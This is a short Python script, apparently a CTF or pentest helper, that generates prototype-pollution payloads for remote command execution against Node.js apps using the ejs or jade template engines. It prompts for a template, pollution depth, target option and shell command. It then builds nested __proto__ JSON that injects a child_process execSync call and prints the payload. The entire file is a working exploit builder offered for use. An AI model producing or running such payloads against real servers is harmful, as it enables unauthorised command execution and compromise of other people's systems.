# -*-coding:utf-8-*-
'''
    @filename: nodejs RCE
    @author: Ricky
'''

model = input("攻击模板(ejs,jade):")
proto = input("污染层数(int):")
if 'ejs' in model:
    ejs = '"{}":"{}; return global.process.mainModule.constructor._load(\'child_process\').execSync(\'{}\');//"'
    param = input("污染参数(outputFunctionName, escapeFunction):")
    exp = input("输入命令(dir,ls...):")
    if 'outputFunctionName' in param:
        poc = '{'+ejs.format(param, 'a=1', exp)+'}'
    else:
        poc = '{"client":true,'+ejs.format(param, '1', exp)+',"compileDebug":true}'
else:
    jade = '"type":"{}","compileDebug":true,"self":true,"line":"0, \\"\\" ));return global.process.mainModule.constructor._load(\'child_process\').execSync(\'{}\');//"'
    param = input("污染参数(Code, BlockComment, Comment, Doctype, MixinBlock):")
    exp = input("输入命令(dir,ls...):")
    poc = '{'+jade.format(param, exp)+'}'

for i in range(int(proto)):
    final_poc = '{"__proto__":'+ poc + '}'
    poc = final_poc

print(final_poc)